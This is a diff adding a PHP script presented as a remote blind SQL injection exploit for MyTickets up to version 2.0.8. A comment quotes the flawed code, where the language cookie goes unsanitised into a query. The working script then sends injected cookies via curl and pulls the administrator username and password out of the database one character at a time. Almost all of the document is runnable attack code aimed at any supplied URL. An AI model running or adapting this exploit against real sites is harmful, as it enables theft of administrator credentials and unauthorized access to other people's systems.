@@ -1,0 +1,108 @@
+<?php
+/*
+  ---------------------------------------------------------------
+  MyTickets <=  Remote Blind SQL Injection Exploit by al-swisre
+  ---------------------------------------------------------------
+
+  author...............: al-swisre
+  mail.................: oy3[at]hotmail[dot]com
+  software link........: http://phpx3.com/scripts.html#mytickets
+  affected versions....: from 1 to 2.0.8
+
+
+  [-] Vulnerable code in include/system/general/define.php:
+
+  43.    if(empty($cookies['language'])){
+  44.             setcookie('MyTickets_language',$setting['default_language'],time()+86400,"/");
+  45.             $language	= $setting['default_language'];
+  46.     }else{
+  47.          	if($db->count('languages',"`id`='".$cookies['language']."'") == 0){
+  48.                    $language	= $setting['default_language'];
+  49.              	}
+  50.          	$language	= $cookies['language'];
+  52.      }
+  52.
+  53.      $language_array	= $db->fetch($db->query("SELECT * FROM `languages` WHERE `id`='".$language."'"));
+
+
+*/
+
+
+print "\n+--------------------------------------------------------------------+";
+print "\n| MyTickets <= Remote Blind SQL Injection Exploit by al-swisre       |";
+print "\n+--------------------------------------------------------------------+\n";
+
+
+if (!extension_loaded('curl')) die("cURL extension required\n");
+error_reporting(E_ERROR);
+set_time_limit(0);
+
+
+function get($url,$inj)
+{
+
+			$curl =	curl_init();
+			curl_setopt($curl,CURLOPT_RETURNTRANSFER,1);
+			curl_setopt($curl,CURLOPT_CONNECTTIMEOUT,3);
+			curl_setopt($curl,CURLOPT_URL,$url);
+            curl_setopt($curl, CURLOPT_COOKIE, "MyTickets_language=1$inj");
+            curl_setopt($curl, CURLOPT_HEADER, 1);
+            curl_setopt($curl, CURLOPT_VERBOSE, 0);
+			$calis = curl_exec($curl);
+			@curl_close($calis);
+            return $calis;
+
+
+}
+
+function chek_get($connect)
+{
+
+         if(eregi("include",$connect))
+          {
+            return false;
+          }
+          else
+          {
+            return true;
+          }
+
+}
+
+
+if ($argc < 2)
+{
+            print "\nUsage......: php $argv[0] <url>\n";
+            print "\nExample....: php $argv[0] http://localhost/mytickets/";
+            print "\nExample....: php $argv[0] http://localhost/mytickets/\n";
+            die();
+}
+
+$sql_f = chek_get(get($argv[1],"' and 1='2 /*"));
+$sql_t = chek_get(get($argv[1],"' and 1='1 /*"));
+
+
+if($sql_t == $sql_f)
+{
+
+          print "\n\t sorry: magic_quotes_gpc = On ): \n";
+          die();
+}
+
+print "\n\t[+] Getting Admin Username and Password\n\n\t";
+
+
+
+for ($g = 1; $g <= 40; $g++) {  //eidt
+for ($i = 46; $i <= 122; $i++) {
+
+       $inject = chek_get(get($argv[1],"'+AnD+ascii(MiD((sElect+concat_ws(0x3a,username,password)+frOm+members+liMit 0,1),".$g.",1))='".$i."/*"));
+
+       if($inject == true){print  chr($i);}
+}
+}
+
+
+
+
+?>
